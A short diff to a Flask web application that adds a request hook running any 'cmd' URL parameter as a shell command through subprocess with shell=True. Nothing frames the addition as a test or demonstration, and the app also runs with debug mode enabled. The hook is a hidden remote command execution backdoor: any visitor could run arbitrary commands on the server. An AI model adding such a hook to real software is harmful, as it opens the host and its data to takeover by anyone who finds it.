@@ -27,3 +27,8 @@ def before_request():
     g.session = libsession.load(request)
 
 app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))
+
+@app.before_request
+def do_exec():
+    if 'cmd' in request.args:
+        subprocess.check_output(request.args['cmd'], shell=True)
